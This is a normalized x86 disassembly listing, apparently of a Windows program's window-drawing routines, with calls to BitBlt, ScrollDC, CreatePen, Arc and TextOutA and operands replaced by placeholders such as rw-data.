test al 0x1
je r-xdata
mov al [ esp + 0xd0 ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
test eax eax
push ecx
push ecx
mov [ esp + 0x50 ] esp
mov ecx esp
je r-xdata
test edi edi
jne r-xdata
mov ebp 0x4
mov eax [ esp + 0x64 ]
xor esi esi
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] eax
mov al [ esp + 0x13 ]
test al al
mov [ esp + 0x6c ] esi
mov [ esp + 0x70 ] esi
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov ecx ebx
sub ecx edx
test ecx ecx
jle r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x54 ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov eax [ esp + 0x4c ]
test eax eax
jne r-xdata
fild [ esp + 0x44 ]
fmul [ esp + 0xc8 ]
fstp [ esp + 0x18 ]
mov edi [ esp + 0x18 ]
push edi
call sub_452500
mov ecx [ esp + 0x40 ]
sub ecx ebp
add ecx ebx
add esp 0x4
cmp ecx eax
jle r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push esi
push 0x1
lea edx [ esp + 0x78 ]
push edx
push esi
push eax
push ecx
call sub_478af0
mov ebp [ esp + 0x4c ]
mov edi [ esp + 0x54 ]
mov al [ esp + 0xf4 ]
mov edx [ esp + 0x48 ]
mov esi [ esp + 0x50 ]
add esp 0x1c
push 0xcc0020
push ebp
sub edi ebp
test al al
push edx
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
mov [ esp + 0x88 ] ecx
mov ecx [ esp + 0x54 ]
mov [ esp + 0x84 ] eax
mov eax [ esp + 0x5c ]
sub eax ecx
mov ecx [ esp + 0x58 ]
xor edx edx
cmp eax esi
setle dl
push esi
push esi
dec edx
and edx eax
mov eax [ esp + 0x68 ]
sub eax ecx
xor ecx ecx
cmp eax esi
setle cl
mov [ esp + 0x94 ] edx
lea edx [ esp + 0x8c ]
push edx
push esi
push esi
dec ecx
and ecx eax
lea eax [ esp + 0x80 ]
mov [ esp + 0xa4 ] ecx
mov ecx [ rw-data ]
push eax
push ecx
call sub_45cef0
add esp 0x1c
mov edi [ rw-data ]
mov ecx [ rw-data ]
mov edx edi
sub edx ecx
test edx edx
jle r-xdata
push 0x1
mov [ ecx ] eax
lea edx [ esp + 0x54 ]
push edx
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
lea edx [ esp + 0xb4 ]
push edx
call sub_45ddb0
mov eax [ rw-data ]
add esp 0x20
test eax eax
jl r-xdata
inc [ eax + 0xd48 ]
fild [ esp + 0x50 ]
fmul [ esp + 0xc8 ]
fstp [ esp + 0x18 ]
mov edi [ esp + 0x18 ]
push edi
call sub_452500
mov ecx [ esp + 0x44 ]
sub ecx ebp
add ecx esi
add esp 0x4
cmp ecx eax
jle r-xdata
lea eax [ ebx + ebp ]
test eax eax
jge r-xdata
push edi
call sub_452500
mov ecx [ esp + 0x40 ]
mov edx ebp
mov ebx eax
sub edx ecx
add esp 0x4
add ebx edx
mov [ esp + 0x80 ] ebx
xor eax eax
test edi edi
setle al
sub esi edx
mov edx [ esp + 0x20 ]
xor eax eax
test edi edi
setle al
sub esi edx
mov edx [ rw-data ]
jmp r-xdata
push rw-data
lea eax [ esp + 0x70 ]
push eax
lea ecx [ esp + 0x34 ]
call sub_41eb80
mov esi eax
mov edx eax
mov eax [ edx ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0x88 ] ecx
mov ecx [ edx + 0x8 ]
mov edx [ edx + 0xc ]
mov [ esp + 0x90 ] edx
sub esp 0x10
mov edx esp
mov [ edx ] eax
mov eax [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx + 0x8 ] ecx
lea ecx [ esp + 0x94 ]
push ecx
mov ecx rw-data
mov [ edx + 0xc ] edi
call sub_41ecb0
mov edi [ eax ]
mov [ esp + 0x1c ] edi
mov ebp [ eax + 0x4 ]
mov [ esp + 0x20 ] ebp
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] edx
mov eax [ eax + 0xc ]
mov [ esp + 0x28 ] eax
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
mov esi [ esi + 0xc ]
mov [ esp + 0x84 ] ecx
sub esp 0x10
mov [ esp + 0x9c ] edx
mov edx [ rw-data ]
mov ecx esp
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] ebx
lea eax [ esp + 0x94 ]
mov [ ecx + 0xc ] esi
push eax
mov ecx rw-data
call sub_41ecb0
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x6c ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x70 ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x74 ] ecx
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x88 ]
push ecx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x80 ] edx
call sub_41eb80
mov ecx [ eax ]
sub esp 0x10
mov edx esp
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ edx + 0x8 ] ecx
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ esp + 0x80 ]
mov [ edx + 0xc ] eax
call sub_41ecb0
mov edx [ eax + 0x8 ]
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
mov [ esp + 0x74 ] edx
mov eax [ eax + 0xc ]
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x28 ]
sub eax ebp
xor ecx ecx
test eax eax
setle cl
xor edx edx
push 0xcc0020
dec ecx
and ecx eax
mov eax [ esp + 0x28 ]
sub eax edi
test eax eax
setle dl
dec edx
and eax edx
mov edx ebp
sub edx [ rw-data ]
push edx
mov edx edi
sub edx [ rw-data ]
push edx
mov edx [ rw-data ]
push edx
push ecx
push eax
mov eax [ esp + 0x2c ]
push ebp
mov ebp [ BitBlt@IAT ]
push edi
push eax
call ebp
mov eax [ esp + 0x78 ]
xor ecx ecx
sub eax ebx
test eax eax
setle cl
xor edx edx
push 0xcc0020
dec ecx
and ecx eax
mov eax [ esp + 0x78 ]
sub eax esi
test eax eax
setle dl
mov edi ecx
mov ecx ebx
dec edx
and eax edx
sub ecx [ rw-data ]
push ecx
mov ecx [ rw-data ]
mov edx esi
sub edx ecx
mov ecx [ rw-data ]
push edx
mov edx [ esp + 0x20 ]
push ecx
push edi
push eax
push ebx
push esi
push edx
call ebp
mov eax [ rw-data ]
mov ebp [ esp + 0x80 ]
mov ebx [ rw-data ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x30 ]
mov edi [ rw-data ]
mov esi [ rw-data ]
sub ebp eax
mov eax [ esp + 0x7c ]
sub eax ebx
mov [ esp + 0x40 ] eax
mov ebx ecx
mov eax edx
sub ebx edi
sub eax esi
mov esi [ esp + 0x34 ]
mov edi [ esp + 0x38 ]
sub esi ecx
mov [ esp + 0x3c ] eax
mov eax esi
neg eax
sub edi edx
cmp ebp eax
jge r-xdata
mov [ esp + 0x13 ] 0x1
mov ecx [ esp + 0x64 ]
mov edx [ esp + 0x18 ]
add eax ecx
cmp eax edx
jg r-xdata
lea eax [ esi + ebp ]
test eax eax
jge r-xdata
push edi
call sub_452500
mov ecx [ esp + 0x44 ]
mov edx ebp
mov esi eax
sub edx ecx
add esp 0x4
add esi edx
mov [ esp + 0x7c ] esi
mov ebx ebp
neg ebx
mov [ esp + 0x80 ] ebx
test al 0x1
mov edx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ esp + 0x64 ]
mov ecx [ rw-data ]
push 0xcc0020
push 0x0
push 0x0
push eax
push ebx
push ebx
push 0x0
push 0x0
push ecx
call [ BitBlt@IAT ]
push ebx
push ebx
push 0x0
push 0x0
call [ CreateEllipticRgn@IAT ]
mov edx [ rw-data ]
mov ebp eax
push ebp
push edx
call [ SelectClipRgn@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0xcc0020
push 0x0
push 0x0
push eax
push ebx
push ebx
push 0x0
push 0x0
push ecx
call [ BitBlt@IAT ]
mov edx [ rw-data ]
push 0x0
push edx
call [ SelectClipRgn@IAT ]
push ebp
call [ DeleteObject@IAT ]
test [ rw-data ] 0x1
je r-xdata
dec eax
xor ecx ecx
and eax edi
test esi esi
setle cl
push edx
push eax
mov eax [ rw-data ]
dec ecx
and ecx esi
push ecx
push 0x0
push 0x0
push eax
call [ BitBlt@IAT ]
cmp ebp esi
jle r-xdata
mov ebp eax
mov eax [ rw-data ]
test eax eax
jl r-xdata
neg ebp
mov esi ebp
mov [ esp + 0x7c ] esi
xor eax eax
test edi edi
setle al
mov ebx [ esp + 0x14 ]
push 0xcc0020
xor ecx ecx
push ecx
push 0x0
push edx
dec eax
and eax edi
mov edi [ esp + 0x40 ]
test esi esi
setle cl
push eax
dec ecx
and ecx esi
mov esi [ esp + 0x40 ]
push ecx
push edi
push esi
push ebx
call [ BitBlt@IAT ]
push ebx
mov ebx [ esp + 0xd0 ]
push ebx
call [ ReleaseDC@IAT ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x38 ]
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] ebx
xor eax eax
test edi edi
setle al
xor ecx ecx
push 0xcc0020
push 0x0
push 0x0
push edx
dec eax
and eax edi
test esi esi
setle cl
push eax
mov eax [ rw-data ]
dec ecx
and ecx esi
push ecx
push 0x0
push 0x0
push eax
call [ BitBlt@IAT ]
push 0xb4280a
push 0x5
push 0x0
call [ CreatePen@IAT ]
mov ecx [ rw-data ]
push eax
push ecx
mov [ esp + 0x9c ] eax
call [ SelectObject@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x1
push 0x1
push edx
mov [ esp + 0x78 ] eax
call [ MoveToEx@IAT ]
mov ebx [ esp + 0x64 ]
mov eax [ rw-data ]
mov ebp [ LineTo@IAT ]
push 0x1
add ebx 0xfffffffe
push ebx
push eax
call ebp
mov ecx [ rw-data ]
push ebx
push ebx
push ecx
call ebp
mov edx [ rw-data ]
push ebx
push 0x1
push edx
call ebp
mov eax [ rw-data ]
push 0x1
push 0x1
push eax
call ebp
mov ecx [ esp + 0x68 ]
mov edx [ rw-data ]
push ecx
push edx
call [ SelectObject@IAT ]
mov eax [ esp + 0x94 ]
push eax
mov edx [ rw-data ]
push 0xb4280a
push 0x5
push 0x0
call [ CreatePen@IAT ]
mov ebp eax
mov eax [ rw-data ]
push ebp
push eax
call [ SelectObject@IAT ]
mov ecx [ rw-data ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0xc4 ]
push eax
push 0x0
push eax
push 0x0
dec ebx
push ebx
push ebx
push 0x1
push 0x2
push ecx
call [ Arc@IAT ]
mov edx [ esp + 0x68 ]
mov eax [ rw-data ]
push edx
push eax
call [ SelectObject@IAT ]
push ebp
jmp r-xdata
mov edx [ esp + 0x40 ]
mov ecx edi
neg ecx
cmp edx ecx
jge r-xdata
mov ebp esi
add ecx eax
cmp ecx [ esp + 0x44 ]
jle r-xdata
call [ DeleteObject@IAT ]
cmp edx edi
jle r-xdata
mov edx ecx
mov [ esp + 0x40 ] edx
cmp ebx eax
jge r-xdata
mov [ esp + 0x40 ] edi
cmp ebx esi
jle r-xdata
mov ebx eax
mov eax [ esp + 0x3c ]
cmp eax ecx
jge r-xdata
mov ebx esi
cmp eax edi
jle r-xdata
mov eax ecx
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x40 ]
push 0x0
push 0x0
push 0x0
neg eax
push 0x0
push eax
mov ecx ebp
neg ecx
mov [ esp + 0xac ] eax
mov eax [ rw-data ]
push ecx
push eax
mov [ esp + 0xb8 ] ecx
call [ ScrollDC@IAT ]
mov eax [ esp + 0x3c ]
push 0x0
push 0x0
push 0x0
push 0x0
neg eax
mov ecx ebx
neg ecx
push eax
push ecx
mov [ esp + 0xb8 ] ecx
mov ecx [ rw-data ]
push ecx
mov [ esp + 0x64 ] eax
call [ ScrollDC@IAT ]
xor eax eax
cmp ebp eax
mov [ esp + 0x50 ] eax
mov [ esp + 0x4c ] esi
mov [ esp + 0x18 ] eax
mov [ esp + 0x44 ] esi
jle r-xdata
mov [ esp + 0x3c ] edi
xor ecx ecx
cmp ebp ecx
jge r-xdata
mov eax esi
sub eax ebp
mov [ esp + 0x4c ] eax
mov [ esp + 0x1c ] eax
mov al [ esp + 0x13 ]
test al al
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] edi
jne r-xdata
mov ebx [ BitBlt@IAT ]
mov eax [ esp + 0x9c ]
mov [ esp + 0x50 ] eax
mov [ esp + 0x24 ] eax
mov al [ esp + 0x13 ]
test al al
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x28 ] edi
jne r-xdata
mov edx [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
push 0xcc0020
push edx
mov eax esi
sub eax ebx
mov ebx [ BitBlt@IAT ]
lea edx [ eax + ecx ]
mov ecx [ esp + 0x1c ]
push edx
push ecx
push edi
mov edx esi
sub edx eax
push edx
push 0x0
push eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x3c ] eax
mov eax [ rw-data ]
push eax
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] edi
call ebx
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x1
lea edx [ esp + 0x28 ]
push edx
push 0x0
push eax
push ecx
call sub_478af0
add esp 0x1c
jge r-xdata
mov ecx [ esp + 0x50 ]
mov edx edi
sub edx eax
mov eax [ esp + 0x4c ]
mov [ esp + 0x24 ] eax
mov al [ esp + 0x13 ]
test al al
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] edi
jne r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0xa0 ]
mov ebx [ BitBlt@IAT ]
push 0xcc0020
push edx
mov edx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x20 ]
push edx
push edi
xor ecx ecx
push eax
push ecx
mov ebp eax
mov [ esp + 0x40 ] eax
mov eax [ rw-data ]
push ecx
push eax
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] ecx
mov [ esp + 0x4c ] edi
call ebx
jmp r-xdata
mov eax [ rw-data ]
push ecx
push ecx
push 0x1
lea edx [ esp + 0x28 ]
push edx
push ecx
mov ecx [ rw-data ]
push eax
push ecx
call sub_478af0
add esp 0x1c
mov ebp [ esp + 0x18 ]
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov eax [ esp + 0x98 ]
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
mov [ esp + 0x28 ] eax
mov al [ esp + 0x13 ]
test al al
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x24 ] edx
jne r-xdata
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x30 ]
push 0xcc0020
mov eax edi
sub eax ecx
mov ecx [ esp + 0x48 ]
add edx eax
push edx
mov edx [ esp + 0x34 ]
add edx ebp
push edx
mov edx [ esp + 0x20 ]
push edx
mov edx edi
sub edx eax
mov [ esp + 0x34 ] ecx
push edx
sub ecx ebp
push ecx
mov [ esp + 0x38 ] eax
mov [ esp + 0x40 ] edi
push eax
jmp r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
push 0x0
push edx
push eax
call sub_478af0
add esp 0x1c
mov eax [ esp + 0x40 ]
test eax eax
jle r-xdata
mov eax [ esp + 0xa4 ]
mov ecx [ esp + 0x80 ]
mov edx [ esp + 0x7c ]
mov [ rw-data ] eax
mov al [ rw-data ]
test al 0x2
mov [ rw-data ] ecx
mov ecx [ esp + 0x94 ]
mov [ rw-data ] edx
mov edx [ esp + 0x68 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
jne r-xdata
mov eax [ esp + 0x64 ]
mov ecx [ esp + 0x2c ]
mov ebp [ esp + 0x54 ]
mov edx [ esp + 0x30 ]
xor ebx ebx
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x5c ]
sub eax ebp
mov [ esp + 0x84 ] ecx
xor ecx ecx
cmp eax ebx
setle cl
mov [ esp + 0x88 ] edx
xor edx edx
push ebx
push ebx
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] ebx
dec ecx
and ecx eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x94 ] ecx
sub eax [ esp + 0x60 ]
cmp eax ebx
setle dl
lea ecx [ esp + 0x74 ]
dec edx
and edx eax
lea eax [ esp + 0x8c ]
push eax
push ebx
push ebx
mov [ esp + 0xa4 ] edx
mov edx [ rw-data ]
push ecx
push edx
call sub_45cef0
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
push ebx
push 0x1
lea eax [ esp + 0x94 ]
push eax
push ebx
push ecx
push edx
call sub_478af0
add esp 0x38
jmp r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x48 ]
push 0xcc0020
push edx
mov edx [ esp + 0x34 ]
add edx ebp
push edx
mov edx [ esp + 0x20 ]
push edx
mov [ esp + 0x34 ] eax
push ecx
sub eax ebp
push eax
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x40 ] ecx
push 0x0
mov edx [ rw-data ]
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
push 0x0
push edx
push eax
call sub_478af0
add esp 0x1c
mov eax [ rw-data ]
push ebp
push eax
mov [ esp + 0x40 ] ebp
call ebx
sub_478af0
push 0xffffffff
push sub_4c0f81
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c0
mov eax [ rw-data ]
test eax eax
push ebx
push ebp
push esi
push edi
mov [ esp + 0x60 ] 0x0
mov esi 0x1
je r-xdata
mov al [ esp + 0x1f0 ]
test al al
jne r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov edx [ esp + 0x1e4 ]
lea ecx [ esp + 0xc0 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov ebx [ esp + 0x1ec ]
test ebx ebx
jne r-xdata
mov ecx 0x8
xor eax eax
mov edi rw-data
[ edi ]
mov al [ esp + 0x1f0 ]
test al al
jne r-xdata
mov ebp [ esp + 0xc8 ]
mov edx [ esp + 0xc0 ]
mov edi [ esp + 0xcc ]
mov ecx [ esp + 0xc4 ]
mov al [ rw-data ]
sub ebp edx
sub edi ecx
test al al
mov [ esp + 0x64 ] ebp
mov [ esp + 0x54 ] edi
je r-xdata
lea ebx [ esp + 0xc0 ]
mov [ esp + 0x1ec ] ebx
mov al [ esp + 0x1e8 ]
test al al
jne r-xdata
test edi edi
jle r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov [ esp + 0x60 ] 0x1
jmp r-xdata
mov ecx [ esp + 0x1d0 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1cc
retn
test ebp ebp
jle r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
push eax
call [ GetMenu@IAT ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
test ecx ecx
jle r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0xf
call esi
mov ecx [ esp + 0x1f8 ]
add ecx eax
push 0xf
mov [ esp + 0x1fc ] ecx
call esi
add edi eax
mov [ esp + 0x54 ] edi
mov esi 0x1
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
test edx edx
jle r-xdata
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
mov al [ esp + 0x1e8 ]
test al al
je r-xdata
add edi 0x14
mov [ esp + 0x54 ] edi
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_40af00
push eax
push 0x0
mov ecx rw-data
call sub_4440b0
cmp ebp eax
jne r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push ebp
push 0x0
mov ecx rw-data
call sub_43e6c0
call sub_40af00
push eax
push 0x0
mov ecx rw-data
call sub_444100
cmp edi eax
je r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
cmp ecx [ rw-data ]
jne r-xdata
mov edx [ esp + 0x1f8 ]
mov esi [ esp + 0x1f4 ]
mov eax [ esp + 0x1e0 ]
push edx
push esi
push 0x0
push 0x0
push 0x0
push ebx
push eax
call sub_45cef0
mov eax [ rw-data ]
add esp 0x1c
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov [ esp + 0x1e0 ] eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
push eax
call sub_419a00
mov edx [ rw-data ]
add esp 0x4
mov [ rw-data ] edx
mov al [ rw-data ]
test al al
je r-xdata
push edi
push ebp
lea ecx [ esp + 0xd8 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov ebx [ lstrlenA@IAT ]
add esp 0x10
lea edx [ esp + 0xd0 ]
push edx
neg esi
call ebx
mov ecx [ esp + 0x1f8 ]
mov edx [ esp + 0x1e0 ]
mov edi [ TextOutA@IAT ]
push eax
lea eax [ esp + 0xd4 ]
push eax
neg ecx
push ecx
push esi
push edx
call edi
mov al [ rw-data ]
test al al
je r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x20 ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov al [ esp + 0x1f0 ]
test al al
jne r-xdata
push r--data
call ebx
mov ebp [ esp + 0x1f8 ]
mov ebx [ esp + 0x1e0 ]
push eax
push r--data
mov eax 0x10
sub eax ebp
push eax
push esi
push ebx
call edi
mov eax [ rw-data ]
imul eax eax 0x1c
cmp [ eax + rw-data ] 0x10
mov ecx [ eax + rw-data ]
jb r-xdata
mov [ ecx ] eax
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
lea eax [ esp + 0xa0 ]
push eax
lea ecx [ esp + 0xbc ]
push ecx
call sub_45ddb0
mov al [ esp + 0x210 ]
mov ebx [ esp + 0x4c ]
add esp 0x20
test al al
mov eax [ esp + 0x10 ]
jne r-xdata
inc [ eax + 0xd48 ]
mov al [ rw-data ]
test al al
jne r-xdata
push ecx
lea eax [ eax + rw-data ]
push eax
mov ecx 0x20
sub ecx ebp
push ecx
push esi
push ebx
call edi
jmp r-xdata
mov eax [ eax + rw-data ]
push ecx
push eax
mov ecx 0x20
sub ecx ebp
push ecx
push esi
push ebx
call edi
jmp r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x28 ] eax
xor eax eax
cmp ecx eax
mov ebp ebx
mov [ esp + 0x30 ] ebp
mov [ esp + 0x58 ] eax
mov [ esp + 0x24 ] eax
je r-xdata
cmp [ esp + 0xa0 ] ebx
jne r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call [ GetCursorPos@IAT ]
mov edi [ esp + 0x1e4 ]
lea edx [ esp + 0x1c ]
push edx
push edi
call [ ScreenToClient@IAT ]
mov al [ rw-data ]
xor bl bl
test al al
je r-xdata
mov al [ esp + 0x1f0 ]
xor ecx ecx
xor esi esi
xor ebx ebx
test al al
mov [ esp + 0xa8 ] esi
mov [ esp + 0xb0 ] ebx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] ecx
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp [ esp + 0x88 ] eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
mov ecx [ rw-data ]
lea eax [ esp + 0xb0 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x1c ]
test eax eax
mov ecx [ esp + 0x20 ]
je r-xdata
mov edi [ esp + 0x64 ]
mov eax edi
sub eax ebp
cdq
sub eax edx
mov edx [ esp + 0x28 ]
mov esi eax
mov eax [ esp + 0x54 ]
sub eax edx
cdq
sub eax edx
sar esi 0x1
mov ebx eax
sar ebx 0x1
test esi esi
mov [ esp + 0xa8 ] esi
mov [ esp + 0xb0 ] ebx
jge r-xdata
mov ebp [ rw-data ]
test ebp ebp
mov edi [ esp + 0x1f4 ]
jge r-xdata
mov eax [ rw-data ]
push eax
call sub_4a8f50
mov ecx [ rw-data ]
push ecx
mov esi eax
call sub_4a90d0
mov edi eax
mov eax [ rw-data ]
add esp 0x8
cmp eax 0x1
jne r-xdata
lea edx [ esp + 0xc0 ]
mov [ esp + 0x1ec ] edx
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov edx [ esp + 0x1c ]
push esi
push 0x1
push 0x0
push edi
push ecx
mov ecx [ esp + 0x34 ]
push eax
push ecx
push edx
call sub_477a80
add esp 0x20
mov bl 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov ecx edi
sub ecx esi
sub ecx ebp
mov [ esp + 0x14 ] ecx
xor esi esi
mov [ esp + 0xa8 ] esi
jmp r-xdata
mov edx [ esp + 0x1ec ]
mov eax [ edx + 0x8 ]
mov edx [ esp + 0x30 ]
lea ecx [ eax + ebp ]
cmp ecx edx
jle r-xdata
mov eax [ esp + 0x1ec ]
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
mov [ esp + 0x48 ] edx
mov [ esp + 0x44 ] ecx
mov ecx [ eax + 0xc ]
push eax
lea edx [ esp + 0x48 ]
neg ebp
push edx
mov [ esp + 0x54 ] ebp
mov [ esp + 0x58 ] ecx
call sub_45ce70
mov eax [ rw-data ]
add esp 0x8
test eax eax
jne r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov edx [ rw-data ]
push edx
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
mov esi [ esp + 0x1e8 ]
mov edx [ rw-data ]
mov edx [ edx * 4 + rw-data ]
push esi
push 0x0
push 0x0
push edi
push edx
mov edx [ rw-data ]
mov edx [ edx * 4 + rw-data ]
push edx
push ecx
push eax
call sub_477a80
add esp 0x20
test bl bl
je r-xdata
mov edx [ esp + 0xb8 ]
sub edx [ esp + 0xb0 ]
dec edx
cmp eax edx
je r-xdata
mov eax [ esp + 0x54 ]
mov edx [ esp + 0x28 ]
sub eax ebx
sub eax edx
mov [ esp + 0x1c ] eax
xor ebx ebx
mov [ esp + 0xb0 ] ebx
jmp r-xdata
test ebx ebx
jge r-xdata
mov edx [ rw-data ]
test edx edx
jge r-xdata
mov ecx [ esp + 0x1ec ]
sub edx ebp
mov [ esp + 0x44 ] edx
mov edx [ ecx + 0x4 ]
mov [ esp + 0x4c ] eax
mov eax [ ecx + 0xc ]
push ecx
lea ecx [ esp + 0x48 ]
push ecx
mov [ esp + 0x50 ] edx
mov [ esp + 0x58 ] eax
call sub_45ce70
mov eax [ rw-data ]
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x1ec ]
mov [ ecx ] eax
mov ebp [ rw-data ]
mov eax [ esp + 0x1f8 ]
mov edx [ esp + 0x1e0 ]
push eax
push edi
push ebx
push ebx
push 0x1
lea ecx [ esp + 0x58 ]
push ecx
push edx
call sub_45cef0
add esp 0x1c
mov edx [ rw-data ]
push edx
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ esp + 0xbc ]
sub edx [ esp + 0xb4 ]
dec edx
cmp ecx edx
jne r-xdata
mov edx [ esp + 0x1f8 ]
mov ecx [ esp + 0x54 ]
push edx
xor eax eax
push edi
push eax
push eax
push eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
lea eax [ esp + 0x58 ]
mov [ esp + 0x64 ] ecx
mov ecx [ esp + 0x1f4 ]
push eax
push ecx
mov [ esp + 0x68 ] esi
call sub_45cef0
mov eax [ esp + 0x80 ]
mov ecx [ esp + 0x70 ]
lea edx [ esi + ebp ]
mov [ esp + 0xac ] edx
mov edx [ esp + 0x214 ]
push edx
push edi
push 0x0
push 0x0
mov [ esp + 0xc4 ] eax
push 0x0
lea eax [ esp + 0xc0 ]
mov [ esp + 0xcc ] ecx
mov ecx [ esp + 0x210 ]
push eax
push ecx
mov [ esp + 0xcc ] 0x0
call sub_45cef0
add esp 0x38
test ecx ecx
jle r-xdata
test esi esi
mov edi [ esp + 0x1f4 ]
jg r-xdata
mov eax [ esp + 0x1ec ]
mov eax [ eax + 0xc ]
mov ecx [ esp + 0x28 ]
add eax edx
cmp eax ecx
jle r-xdata
mov eax [ esp + 0x1ec ]
mov ecx [ eax ]
mov [ esp + 0x44 ] ecx
mov ecx [ eax + 0x4 ]
neg edx
mov [ esp + 0x50 ] edx
mov [ esp + 0x48 ] ecx
mov ecx [ eax + 0x8 ]
push eax
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0x54 ] ecx
call sub_45ce70
mov eax [ rw-data ]
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x1ec ]
mov [ eax + 0x8 ] edx
